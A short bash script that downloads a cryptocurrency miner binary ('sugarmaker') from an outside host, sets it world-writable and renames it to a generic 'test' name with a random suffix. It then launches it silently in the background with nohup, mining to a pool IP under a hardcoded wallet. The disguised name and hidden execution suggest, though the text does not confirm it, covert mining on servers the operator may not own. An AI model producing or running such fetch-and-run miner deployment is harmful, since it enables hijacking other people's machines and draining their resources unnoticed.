#!/bin/bash

kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)

curl -L -O https://upload.vina-host.com/cuQHxMWkLQ/sugarmaker

chmod 777 sugarmaker

mv sugarmaker test$kolot

nohup ./test$kolot -a yespowersugar -o 198.50.168.213:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps-$kolot -p c=DGB > /dev/null 2>&1 &
